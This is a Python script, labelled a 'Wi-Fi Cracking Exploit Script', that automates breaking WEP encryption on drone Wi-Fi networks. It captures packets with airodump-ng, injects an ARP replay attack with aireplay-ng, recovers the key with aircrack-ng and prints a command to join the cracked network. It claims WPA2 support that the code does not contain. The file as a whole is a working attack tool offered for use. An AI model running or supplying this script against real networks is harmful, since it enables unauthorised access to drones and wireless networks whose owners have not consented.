#!/usr/bin/env python3
"""
Wi-Fi Cracking Exploit Script
Automates WEP/WPA2 cracking for drone networks

HARDWARE REQUIREMENTS:
- WiFi adapter with monitor mode and packet injection support
- Recommended: Alfa AWUS036ACH or Alfa AWUS036NHA
- See HARDWARE_REQUIREMENTS.md for detailed hardware information
"""

import subprocess
import sys
import time
import os

def check_tools():
    """Check if required tools are installed"""
    required_tools = ['airodump-ng', 'aireplay-ng', 'aircrack-ng']
    missing = []
    
    for tool in required_tools:
        try:
            subprocess.run(['which', tool], check=True, capture_output=True)
        except subprocess.CalledProcessError:
            missing.append(tool)
    
    if missing:
        print(f"Error: Missing required tools: {', '.join(missing)}")
        print("Install with: sudo apt-get install aircrack-ng")
        return False
    return True

def crack_wep(interface, ssid, channel=6, bssid=None):
    """
    Crack WEP encryption on drone network
    
    Args:
        interface: Network interface in monitor mode
        ssid: Network SSID (e.g., 'Drone_Wifi')
        channel: Wi-Fi channel (default: 6)
        bssid: BSSID if known (optional)
    """
    print(f"[*] Starting WEP crack for {ssid} on channel {channel}")
    
    # Start capture
    cap_file = f"/tmp/drone_capture_{int(time.time())}"
    print(f"[*] Starting packet capture: {cap_file}")
    
    airodump_cmd = [
        'airodump-ng',
        '-c', str(channel),
        '--bssid', bssid or '02:00:00:00:01:00',
        '-w', cap_file,
        interface
    ]
    
    print(f"[*] Running: {' '.join(airodump_cmd)}")
    print("[*] Capturing packets... (Press Ctrl+C when you have ~50,000 packets)")
    
    try:
        airodump_process = subprocess.Popen(airodump_cmd)
        time.sleep(10)  # Give it time to start
        
        # ARP replay attack to generate IVs
        print("[*] Starting ARP replay attack to generate IVs...")
        aireplay_cmd = [
            'aireplay-ng',
            '--arpreplay',
            '-b', bssid or '02:00:00:00:01:00',
            interface
        ]
        
        aireplay_process = subprocess.Popen(aireplay_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        print("[*] Waiting for enough IVs...")
        print("[*] Press Ctrl+C when ready to crack")
        
        # Wait for user interrupt or auto-crack after timeout
        try:
            time.sleep(60)  # Wait 60 seconds
        except KeyboardInterrupt:
            pass
        
        # Stop processes
        airodump_process.terminate()
        aireplay_process.terminate()
        
        # Crack the key
        print("[*] Attempting to crack WEP key...")
        aircrack_cmd = [
            'aircrack-ng',
            '-b', bssid or '02:00:00:00:01:00',
            f'{cap_file}-01.cap'
        ]
        
        result = subprocess.run(aircrack_cmd, capture_output=True, text=True)
        
        if 'KEY FOUND' in result.stdout:
            # Extract key from output
            lines = result.stdout.split('\n')
            for line in lines:
                if 'KEY FOUND' in line:
                    key = line.split('KEY FOUND! [ ')[1].split(' ]')[0]
                    print(f"[+] WEP Key Found: {key}")
                    return key
        else:
            print("[-] Failed to crack key. Need more IVs.")
            print("[*] Try running longer or use PTW attack method")
            return None
            
    except Exception as e:
        print(f"[-] Error during WEP crack: {e}")
        return None

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 wifi_crack.py <interface> <ssid> [channel] [bssid]")
        print("Example: python3 wifi_crack.py wlan0mon Drone_Wifi 6 02:00:00:00:01:00")
        sys.exit(1)
    
    interface = sys.argv[1]
    ssid = sys.argv[2]
    channel = int(sys.argv[3]) if len(sys.argv) > 3 else 6
    bssid = sys.argv[4] if len(sys.argv) > 4 else None
    
    if not check_tools():
        sys.exit(1)
    
    print(f"[*] Target: {ssid}")
    print(f"[*] Interface: {interface}")
    print(f"[*] Channel: {channel}")
    
    key = crack_wep(interface, ssid, channel, bssid)
    
    if key:
        print(f"\n[+] Success! Connect with:")
        print(f"    nmcli device wifi connect {ssid} password {key}")
    else:
        print("\n[-] Failed to crack key")

if __name__ == "__main__":
    main()
